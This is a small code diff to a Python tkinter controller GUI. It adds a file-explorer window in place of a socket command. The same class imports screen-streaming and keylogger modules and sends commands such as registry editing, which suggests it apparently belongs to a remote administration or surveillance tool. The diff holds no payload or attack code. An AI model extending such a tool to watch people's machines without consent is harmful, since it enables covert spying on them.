@@ -5,6 +5,7 @@ import queue
 
 import ui.ui_screenStream as sc
 import ui.ui_keylogger as kl
+import ui.ui_fileExplorer as fe
 
 class UI_main(tk.Tk):
     def __init__(self):
@@ -97,7 +98,9 @@ class UI_main(tk.Tk):
         window.focus()
 
     def fileExplorer(self):
-        self.socket_cmd("fileExplorer")
+        window = fe.UI_fileExplorer(self)
+        window.grab_set()
+        window.focus()
 
     def editRegistry(self):
         self.socket_cmd("editRegistry")
